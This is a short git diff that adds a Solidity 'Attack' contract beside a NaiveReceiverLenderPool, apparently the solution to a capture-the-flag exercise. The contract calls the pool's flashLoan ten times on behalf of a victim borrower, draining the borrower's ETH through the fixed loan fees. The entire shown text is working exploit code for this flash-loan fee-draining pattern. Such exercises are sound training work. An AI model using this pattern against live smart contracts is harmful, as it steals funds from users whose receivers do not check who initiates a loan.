@@ -43,3 +43,23 @@ contract NaiveReceiverLenderPool is ReentrancyGuard {
     // Allow deposits of ETH
     receive () external payable {}
 }
+
+contract Attack {
+    NaiveReceiverLenderPool pool;
+
+    constructor(address payable poolAddr) {
+        pool = NaiveReceiverLenderPool(poolAddr);
+    }
+    function attack(address borrower) public {
+        pool.flashLoan(borrower, 0);
+        pool.flashLoan(borrower, 0);
+        pool.flashLoan(borrower, 0);
+        pool.flashLoan(borrower, 0);
+        pool.flashLoan(borrower, 0);
+        pool.flashLoan(borrower, 0);
+        pool.flashLoan(borrower, 0);
+        pool.flashLoan(borrower, 0);
+        pool.flashLoan(borrower, 0);
+        pool.flashLoan(borrower, 0);
+    }
+}
